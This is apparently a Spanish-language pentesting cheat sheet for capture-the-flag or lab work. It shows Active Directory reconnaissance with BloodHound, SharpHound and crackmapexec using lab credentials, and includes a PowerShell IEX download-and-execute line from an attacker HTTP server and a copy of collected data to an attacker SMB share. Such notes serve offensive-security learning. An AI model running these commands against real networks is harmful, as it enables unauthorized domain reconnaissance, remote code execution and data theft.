


# BLOODHOUND PYTHON

```bash
## De Forma remota
❯ sudo neo4j console

> bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -dc htb.local -ns 10.10.10.161 -c All
> cme ldap hokkaido-aerospace.com -u hrapp-service -p 'Untimed$Runny' --bloodhound -c all -ns 192.168.154.40
> 
## Conectado a la maquina victima
> .\SharpHound.exe -C All --Domain htb.local
```

# SHARPHOUND EXE
```shell
❯ wget https://github.com/BloodHoundAD/SharpHound/releases/download/v2.5.8/SharpHound-v2.5.8.zip

#EXTRAER CONTENIDO
❯ mv SharpHound-v2.5.8.zip ./SharpHound.zip
❯ unzip SharpHound.zip

#SUBIR EL BINARIO
*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe

#EJECUTARLO
*Evil-WinRM* PS C:\Users\support\Documents> .\SharpHound.exe -c All
```

# SHARPHOUND PS1
```shell
#EXTRAER CONTENIDO
❯ mv SharpHound-v2.5.8.zip ./SharpHound.zip
❯ unzip SharpHound-v2.5.8.zip

#SUBIR EL PS1 CON PYTHON
❯ sudo python3 -m http.server 80
*Evil-WinRM* PS C:\Users\amanda\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/SharpHound.ps1')
*Evil-WinRM* PS C:\Users\amanda\Documents> Invoke-BloodHound -CollectionMethod All
❯ sudo impacket-smbserver smbFolder $(pwd) -smb2support
*Evil-WinRM* PS C:\Users\amanda\Documents> copy 20241112105820_BloodHound.zip \\192.168.45.192\smbFolder\20241028064654_BloodHound.zip
```

